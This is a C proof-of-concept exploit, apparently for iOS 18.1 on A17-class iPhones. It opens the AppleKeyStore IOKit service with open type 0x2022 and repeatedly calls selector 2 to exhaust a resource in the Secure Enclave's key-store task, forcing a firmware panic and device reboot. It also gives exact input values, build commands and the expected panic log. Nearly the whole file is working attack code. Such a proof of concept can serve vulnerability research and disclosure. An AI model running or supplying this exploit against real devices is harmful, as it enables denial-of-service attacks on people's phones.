/*
 * SEP Panic Proof-of-Concept
 *
 * Target: AppleKeyStore / AppleSEPKeyStore
 * Effect: Triggers SEP firmware panic (device reboot)
 * Tested: iOS 18.1 (23B85), iPhone with A17+ SoC
 *
 * OVERVIEW:
 * The SEP (Secure Enclave Processor) has a resource exhaustion bug in its
 * SKS (SEPKeyStore) task. After ~41 consecutive calls to AppleKeyStore
 * selector 2, the SEP firmware panics.
 *
 * PANIC SIGNATURE:
 *   panic(cpu X caller 0x...): SEP Panic: :sks /sks : 0x0006fea7 ...
 *
 * The crash address 0x0006fea7 is 100% consistent across all panics,
 * indicating a deterministic code path (no ASLR in SEP firmware).
 */

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#define APPLE_KEYSTORE_SERVICE  "AppleKeyStore"
#define VULNERABLE_OPEN_TYPE    0x2022
#define VULNERABLE_SELECTOR     2
#define PANIC_THRESHOLD         41

int main(int argc, char *argv[]) {
    kern_return_t kr;
    io_service_t service;
    io_connect_t connection;

    printf("=== SEP Panic PoC ===\n\n");
    printf("Target: AppleKeyStore selector %d\n", VULNERABLE_SELECTOR);
    printf("Open type: 0x%x\n", VULNERABLE_OPEN_TYPE);
    printf("Panic threshold: ~%d calls\n\n", PANIC_THRESHOLD);

    // Step 1: Find AppleKeyStore service
    service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching(APPLE_KEYSTORE_SERVICE)
    );

    if (service == IO_OBJECT_NULL) {
        printf("[-] AppleKeyStore service not found\n");
        return 1;
    }
    printf("[+] Found AppleKeyStore service: 0x%x\n", service);

    // Step 2: Open connection with type 0x2022
    // This open type exposes the vulnerable IOUserClient interface
    kr = IOServiceOpen(service, mach_task_self(), VULNERABLE_OPEN_TYPE, &connection);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        printf("[-] IOServiceOpen failed: 0x%x\n", kr);
        return 1;
    }
    printf("[+] Opened connection: 0x%x\n\n", connection);

    // Step 3: Call selector 2 repeatedly until SEP panics
    //
    // Input format: 6 scalar uint64_t values
    //   scalars[0] = 1      (operation code)
    //   scalars[1] = 0
    //   scalars[2] = 0
    //   scalars[3] = 0x10   (flags)
    //   scalars[4] = 0
    //   scalars[5] = 0
    //
    // The SEP's sks task has a counter or resource pool that overflows
    // after approximately 41 successful calls, causing a firmware panic.

    printf("[*] Starting SEP exhaustion attack...\n");
    printf("[*] Device will reboot when SEP panics (~call #%d)\n\n", PANIC_THRESHOLD);

    for (int i = 0; i < 50; i++) {
        uint64_t scalars[6] = {
            1,      // op = 1 (allocate/unlock operation)
            0,
            0,
            0x10,   // flags = 0x10
            0,
            0
        };
        uint64_t output[1] = {0};
        uint32_t outputCount = 1;

        kr = IOConnectCallMethod(
            connection,
            VULNERABLE_SELECTOR,    // selector 2
            scalars, 6,             // 6 scalar inputs
            NULL, 0,                // no struct input
            output, &outputCount,   // scalar output
            NULL, NULL              // no struct output
        );

        printf("[%2d/50] kr=0x%08x", i + 1, kr);

        if (i + 1 >= PANIC_THRESHOLD) {
            printf(" <-- THRESHOLD REACHED");
        }
        printf("\n");

        // 1ms delay between calls (required for consistent trigger)
        usleep(1000);
    }

    // If we reach here, the panic didn't occur
    printf("\n[?] Completed 50 calls without panic\n");
    printf("[?] Check if device is vulnerable or try again\n");

    IOServiceClose(connection);
    return 0;
}

/*
 * BUILD (on macOS with Xcode):
 *   clang -framework IOKit -framework CoreFoundation sep_panic_poc.c -o sep_panic
 *
 * For iOS, add to an Xcode project and link IOKit.framework
 *
 * EXPECTED PANIC LOG:
 *   panic(cpu 2 caller 0x...): SEP Panic: :sks /sks : 0x0006fea7 0x00058fe8 ...
 *
 *   SEP Task Dump:
 *   SEPO/BOOT
 *   SEPO/EXCP 0xc630/0xcab8/0x0000000000000013 er/EXCP
 *   sks /sks  0x4cb90/0x4c8b8/0x1314131413141314 ert/BOOT   <-- Crashed task
 *   ...
 *   Firmware type: UNKNOWN SEPOS
 *   SEP state: 7
 */
